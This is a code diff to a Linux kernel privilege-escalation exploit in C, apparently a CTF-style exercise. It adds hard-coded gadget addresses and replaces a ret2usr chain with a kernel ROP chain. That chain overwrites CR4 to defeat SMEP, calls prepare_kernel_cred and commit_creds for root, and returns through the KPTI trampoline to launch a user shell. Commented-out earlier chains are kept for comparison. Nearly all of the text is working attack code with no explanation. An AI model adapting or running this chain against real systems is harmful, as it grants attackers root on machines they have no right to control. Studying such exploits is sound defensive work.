@@ -12,12 +12,15 @@
 #define XCHG_EAX_ESP 0xffffffff8100e7f8 // xchg eax, esp; ret;
 #define POP_RDI_RET 0xffffffff810013e3
 #define POP_RDX_RET 0xffffffff81089d39
+#define PUSH_RAX_POP_RBP_POP_R12_RET 0xffffffff8132bbe8
+#define PUSH_RBP_POP_RDI_RET 0xffffffff813ee2f7
 #define FAKE_RSP 0x8100e7f8
 #define EVIL_CR4 0x6f0 
 #define EFLAGS 0x282
 #define NATIVE_WRITE_CR4 0xffffffff8104e70a // mov cr4, rdi; push rdx; popfq; retq;
 #define SWAPGS 0xffffffff81c00d5a // swapgs; popfq; retq;
 #define IRETQ 0xffffffff81021e52 // iretq; retq;
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00985
 #define PREPARE_KERNEL_CRED 0xffffffff81082600
 #define COMMIT_CREDS 0xffffffff81082350
 
@@ -84,16 +87,65 @@ void setupRop(uint64_t *value) {
     	}
 	printf("[+] fake_rsp: %x\n", fake_rsp + 0x7f8);
 	save_status();
-	uint64_t rop[14] = {
+	// ret2usr
+	//uint64_t rop[14] = {
+	//	POP_RDI_RET,
+	//	EVIL_CR4, 
+	//	POP_RDX_RET,
+	//	EFLAGS,
+	//	NATIVE_WRITE_CR4,
+	//	(size_t)root,
+	//	SWAPGS, 
+	//	0,
+	//	IRETQ,
+	//	(size_t)shell,
+	//	user_cs,
+	//	user_rflags,
+	//	user_sp, 
+	//	user_ss 	
+	//};
+	
+	//kernel rop to bypass smep.
+	//uint64_t rop[20] = {
+	//	POP_RDI_RET,
+	//	EVIL_CR4, 
+	//	POP_RDX_RET,
+	//	EFLAGS,
+	//	NATIVE_WRITE_CR4,
+	//	POP_RDI_RET,
+	//	0,
+	//	PREPARE_KERNEL_CRED,
+	//	PUSH_RAX_POP_RBP_POP_R12_RET,
+	//	0,
+	//	PUSH_RBP_POP_RDI_RET,
+	//	COMMIT_CREDS,
+	//	SWAPGS, 
+	//	0,
+	//	IRETQ,
+	//	(size_t)shell,
+	//	user_cs,
+	//	user_rflags,
+	//	user_sp, 
+	//	user_ss 	
+	//};
+	
+	// kernel rop to bypass smep and kpti
+	uint64_t rop[20] = {
 		POP_RDI_RET,
 		EVIL_CR4, 
 		POP_RDX_RET,
 		EFLAGS,
 		NATIVE_WRITE_CR4,
-		(size_t)root,
-		SWAPGS, 
+		POP_RDI_RET,
 		0,
-		IRETQ,
+		PREPARE_KERNEL_CRED,
+		PUSH_RAX_POP_RBP_POP_R12_RET,
+		0,
+		PUSH_RBP_POP_RDI_RET,
+		COMMIT_CREDS,
+		SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE,
+		0,
+		0,
 		(size_t)shell,
 		user_cs,
 		user_rflags,
